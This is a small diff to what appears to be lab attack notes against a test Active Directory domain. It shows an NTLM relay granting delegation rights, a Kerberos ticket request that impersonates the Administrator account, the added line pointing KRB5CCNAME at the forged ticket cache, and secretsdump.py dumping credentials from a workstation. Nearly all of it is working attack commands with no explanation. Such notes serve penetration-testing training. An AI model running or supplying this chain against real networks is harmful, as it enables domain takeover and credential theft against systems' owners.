@@ -85,4 +85,5 @@ ntlmrelayx.py -t ldap://hl-dc01.hackinglabs.lan -smb2support --delegate-access -
 #Use delegation rights obtained by RBCD
 getST.py -spn cifs/HL-WS02.hackinglabs.lan 'hackinglabs.lan/jbieberMachine$' -impersonate Administrator
 #use TGS to dump secrets on target
+export KRB5CCNAME=`pwd`/Administrator.ccache
 secretsdump.py -k -no-pass HL-WS02.hackinglabs.lan
